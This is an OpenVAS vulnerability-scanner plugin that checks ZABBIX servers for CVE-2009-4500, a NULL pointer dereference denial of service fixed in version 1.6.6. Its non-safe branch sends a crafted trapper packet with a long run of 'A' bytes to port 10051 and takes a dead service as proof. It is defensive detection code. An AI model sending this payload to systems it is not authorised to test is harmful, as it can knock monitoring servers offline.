###############################################################################
# OpenVAS Vulnerability Test
#
# ZABBIX 'process_trap()' NULL Pointer Dereference Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zabbix:zabbix";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100404");
  script_version("2020-11-10T09:46:51+0000");
  script_tag(name:"last_modification", value:"2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)");
  script_tag(name:"creation_date", value:"2009-12-17 19:46:08 +0100 (Thu, 17 Dec 2009)");
  script_cve_id("CVE-2009-4500");
  script_bugtraq_id(37308);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("ZABBIX 'process_trap()' NULL Pointer Dereference Denial Of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("zabbix_detect.nasl", "zabbix_web_detect.nasl"); # nb: Only the Web-GUI is providing a version
  script_mandatory_keys("Zabbix/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/37740/");
  script_xref(name:"URL", value:"https://support.zabbix.com/browse/ZBX-993");

  script_tag(name:"summary", value:"ZABBIX is prone to a denial-of-service vulnerability because
  of a NULL-pointer dereference.");

  script_tag(name:"impact", value:"Successful exploits may allow remote attackers to cause denial-of-
  service conditions. Given the nature of this issue, attackers may also
  be able to run arbitrary code, but this has not been confirmed.");

  script_tag(name:"affected", value:"Versions prior to ZABBIX 1.6.6 are vulnerable.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("version_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("port_service_func.inc");

if( safe_checks() ) {

  if( ! port = get_app_port( cpe:CPE, service:"www" ) ) # nb: "www" because only the Web-GUI is providing a version
    exit( 0 );

  if( ! vers = get_app_version( cpe:CPE, port:port ) )
    exit( 0 );

  if( version_is_less( version:vers, test_version:"1.6.6" ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"1.6.6" );
    security_message( port:port, data:report );
    exit( 0 );
  }
} else {

  port = service_get_port( default:10051, proto:"zabbix" );

  soc = open_sock_tcp( port );
  if( ! soc ) exit( 0 );

  header = string("ZBXD") + raw_string(0x01);
  data  += crap(data:"A", length: 2500);
  data  += string(":B");
  size   = strlen(data);
  req = header + size + data;

  send( socket:soc, data:req );
  close( soc );

  sleep( 5 );

  soc1 = open_sock_tcp( port );

  if( ! soc1 ) {
    security_message( port:port );
    exit( 0 );
  }
  close( soc1 );
}

exit( 0 );
